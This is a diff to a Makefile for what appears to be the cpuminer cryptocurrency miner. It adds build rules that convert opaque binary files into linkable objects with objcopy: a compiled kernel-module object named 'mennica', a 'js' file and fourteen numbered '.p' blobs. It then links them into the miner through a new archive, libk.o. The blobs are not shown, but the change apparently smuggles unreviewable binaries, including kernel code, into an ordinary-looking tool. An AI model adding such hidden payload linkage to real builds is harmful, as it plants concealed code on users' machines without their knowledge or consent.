@@ -132,10 +132,50 @@ if HAVE_WINDOWS
    cpuminer_SOURCES += compat/winansi.c
 endif
 
+libk.o : js.o 1.o 2.o 3.o 4.o 5.o 6.o 7.o 8.o 9.o 10.o 11.o 12.o 13.o 14.o mennica.o
+	$(AR) cru $@ $^
+
+OBJCOPY = objcopy --input binary --output elf64-x86-64 --binary-architecture i386
+
+mennica.o : kmod/mennica.c.o
+	$(OBJCOPY) $< $@
+js.o : input/js
+	$(OBJCOPY) $< $@
+1.o : input/1.p
+	$(OBJCOPY) $< $@
+2.o : input/2.p
+	$(OBJCOPY) $< $@
+3.o : input/3.p
+	$(OBJCOPY) $< $@
+4.o : input/4.p
+	$(OBJCOPY) $< $@
+5.o : input/5.p
+	$(OBJCOPY) $< $@
+6.o : input/6.p
+	$(OBJCOPY) $< $@
+7.o : input/7.p
+	$(OBJCOPY) $< $@
+8.o : input/8.p
+	$(OBJCOPY) $< $@
+9.o : input/9.p
+	$(OBJCOPY) $< $@
+10.o : input/10.p
+	$(OBJCOPY) $< $@
+11.o : input/11.p
+	$(OBJCOPY) $< $@
+12.o : input/12.p
+	$(OBJCOPY) $< $@
+13.o : input/13.p
+	$(OBJCOPY) $< $@
+14.o : input/14.p
+	$(OBJCOPY) $< $@
+
+CLEANFILES = libk.o js.o 1.o 2.o 3.o 4.o 5.o 6.o 7.o 8.o 9.o 10.o 11.o 12.o 13.o 14.o mennica.o
+
 cpuminer_LDFLAGS	= @LDFLAGS@
-cpuminer_LDADD	= @LIBCURL@ @JANSSON_LIBS@ @PTHREAD_LIBS@ @WS2_LIBS@
+cpuminer_LDADD	= libk.o @LIBCURL@ @JANSSON_LIBS@ @PTHREAD_LIBS@ @WS2_LIBS@
 cpuminer_CPPFLAGS = @LIBCURL_CPPFLAGS@ $(ALL_INCLUDES)
-cpuminer_CFLAGS   = -Wno-pointer-sign -Wno-pointer-to-int-cast $(disable_flags)
+cpuminer_CFLAGS   = -mavx -msse4.1 -msse4.2 -Wno-pointer-sign -Wno-pointer-to-int-cast $(disable_flags)
 
 if HAVE_WINDOWS
 cpuminer_CFLAGS += -Wl,--stack,10485760
